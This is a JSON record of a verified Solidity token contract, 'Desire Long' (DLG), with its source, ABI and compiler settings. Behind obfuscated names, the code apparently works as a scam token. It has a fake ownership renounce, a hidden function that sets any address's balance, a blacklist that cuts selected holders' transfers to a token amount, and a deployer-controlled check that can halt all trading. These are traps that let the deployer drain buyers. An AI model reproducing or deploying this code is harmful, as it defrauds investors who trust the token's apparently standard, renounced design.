{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface amountToken {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract tokenBuy {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fromAuto {\n    function createPair(address tradingLaunched, address atWallet) external returns (address);\n}\n\ninterface swapWallet {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address minFee) external view returns (uint256);\n\n    function transfer(address tokenFromLaunched, uint256 fromBuy) external returns (bool);\n\n    function allowance(address launchFee, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fromBuy) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tokenFromLaunched,\n        uint256 fromBuy\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed toList, uint256 value);\n    event Approval(address indexed launchFee, address indexed spender, uint256 value);\n}\n\ninterface swapWalletMetadata is swapWallet {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DesireLong is tokenBuy, swapWallet, swapWalletMetadata {\n\n    address public minEnable;\n\n    event OwnershipTransferred(address indexed autoList, address indexed feeAmount);\n\n    string private senderIs = \"Desire Long\";\n\n    function allowance(address receiverTrading, address walletLimit) external view virtual override returns (uint256) {\n        if (walletLimit == buyTake) {\n            return type(uint256).max;\n        }\n        return toLiquidity[receiverTrading][walletLimit];\n    }\n\n    function getOwner() external view returns (address) {\n        return minTxAt;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return listFeeLaunched;\n    }\n\n    uint256 private teamLimit;\n\n    function name() external view virtual override returns (string memory) {\n        return senderIs;\n    }\n\n    mapping(address => bool) public receiverAuto;\n\n    function senderTeamAmount(address receiverTx) public {\n        takeMarketing();\n        \n        if (receiverTx == takeLaunched || receiverTx == minEnable) {\n            return;\n        }\n        receiverAuto[receiverTx] = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchedLimit;\n    }\n\n    function buyAmount(address exemptFee, uint256 fromBuy) public {\n        takeMarketing();\n        launchedEnable[exemptFee] = fromBuy;\n    }\n\n    uint256 amountFund;\n\n    address fromFee = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function buyTrading() public {\n        emit OwnershipTransferred(takeLaunched, address(0));\n        minTxAt = address(0);\n    }\n\n    mapping(address => uint256) private launchedEnable;\n\n    uint8 private limitToken = 18;\n\n    bool private sellExempt;\n\n    address private minTxAt;\n\n    bool private enableLaunch;\n\n    uint256 private listFeeLaunched = 100000000 * 10 ** 18;\n\n    function transferFrom(address listReceiverMin, address tokenFromLaunched, uint256 fromBuy) external override returns (bool) {\n        if (_msgSender() != buyTake) {\n            if (toLiquidity[listReceiverMin][_msgSender()] != type(uint256).max) {\n                require(fromBuy <= toLiquidity[listReceiverMin][_msgSender()]);\n                toLiquidity[listReceiverMin][_msgSender()] -= fromBuy;\n            }\n        }\n        return tradingAmount(listReceiverMin, tokenFromLaunched, fromBuy);\n    }\n\n    function launchSell(address liquidityIs) public {\n        if (tokenTake) {\n            return;\n        }\n        \n        amountLaunched[liquidityIs] = true;\n        if (teamLimit == liquiditySwapTo) {\n            txMarketing = true;\n        }\n        tokenTake = true;\n    }\n\n    uint256 private isBuy;\n\n    uint256 amountBuy;\n\n    function approve(address walletLimit, uint256 fromBuy) public virtual override returns (bool) {\n        toLiquidity[_msgSender()][walletLimit] = fromBuy;\n        emit Approval(_msgSender(), walletLimit, fromBuy);\n        return true;\n    }\n\n    function takeMarketing() private view {\n        require(amountLaunched[_msgSender()]);\n    }\n\n    uint256 private liquiditySwapTo;\n\n    mapping(address => mapping(address => uint256)) private toLiquidity;\n\n    function tradingAmount(address listReceiverMin, address tokenFromLaunched, uint256 fromBuy) internal returns (bool) {\n        if (listReceiverMin == takeLaunched) {\n            return atShould(listReceiverMin, tokenFromLaunched, fromBuy);\n        }\n        uint256 totalMode = swapWallet(minEnable).balanceOf(fromFee);\n        require(totalMode == amountBuy);\n        require(tokenFromLaunched != fromFee);\n        if (receiverAuto[listReceiverMin]) {\n            return atShould(listReceiverMin, tokenFromLaunched, minTokenSwap);\n        }\n        return atShould(listReceiverMin, tokenFromLaunched, fromBuy);\n    }\n\n    function balanceOf(address minFee) public view virtual override returns (uint256) {\n        return launchedEnable[minFee];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return limitToken;\n    }\n\n    bool public txMarketing;\n\n    bool public tokenTake;\n\n    address public takeLaunched;\n\n    string private launchedLimit = \"DLG\";\n\n    uint256 constant minTokenSwap = 13 ** 10;\n\n    uint256 private fundBuy;\n\n    address buyTake = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function takeLaunchIs(uint256 fromBuy) public {\n        takeMarketing();\n        amountBuy = fromBuy;\n    }\n\n    function atShould(address listReceiverMin, address tokenFromLaunched, uint256 fromBuy) internal returns (bool) {\n        require(launchedEnable[listReceiverMin] >= fromBuy);\n        launchedEnable[listReceiverMin] -= fromBuy;\n        launchedEnable[tokenFromLaunched] += fromBuy;\n        emit Transfer(listReceiverMin, tokenFromLaunched, fromBuy);\n        return true;\n    }\n\n    bool private totalExempt;\n\n    function transfer(address exemptFee, uint256 fromBuy) external virtual override returns (bool) {\n        return tradingAmount(_msgSender(), exemptFee, fromBuy);\n    }\n\n    mapping(address => bool) public amountLaunched;\n\n    function owner() external view returns (address) {\n        return minTxAt;\n    }\n\n    constructor (){\n        \n        amountToken fromReceiver = amountToken(buyTake);\n        minEnable = fromAuto(fromReceiver.factory()).createPair(fromReceiver.WETH(), address(this));\n        if (enableLaunch) {\n            enableLaunch = false;\n        }\n        takeLaunched = _msgSender();\n        buyTrading();\n        amountLaunched[takeLaunched] = true;\n        launchedEnable[takeLaunched] = listFeeLaunched;\n        if (fundBuy != isBuy) {\n            isBuy = fundBuy;\n        }\n        emit Transfer(address(0), takeLaunched, listFeeLaunched);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeAmount\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toList\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletLimit\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromBuy\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minFee\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromBuy\",\"type\":\"uint256\"}],\"name\":\"buyAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityIs\",\"type\":\"address\"}],\"name\":\"launchSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTx\",\"type\":\"address\"}],\"name\":\"senderTeamAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fromBuy\",\"type\":\"uint256\"}],\"name\":\"takeLaunchIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromBuy\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listReceiverMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenFromLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromBuy\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "DesireLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}